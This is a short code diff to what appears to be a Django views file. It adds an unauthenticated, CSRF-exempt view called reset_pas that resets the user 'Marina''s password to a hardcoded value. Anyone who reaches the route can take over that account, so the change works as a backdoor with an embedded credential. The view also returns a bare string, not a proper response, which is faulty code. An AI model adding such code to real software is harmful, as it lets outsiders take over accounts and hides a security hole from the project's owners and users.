@@ -270,7 +270,13 @@ def default_mode(request):
 
         return redirect(home)
 
-
+from django.contrib.auth.models import User
+@csrf_exempt
+def reset_pas(request):
+    user = User.objects.get(username='Marina')
+    user.set_password('devpass123A!')
+    user.save()
+    return 'OK'
 @login_required
 def amo_register(request):
     if request.method == 'POST':
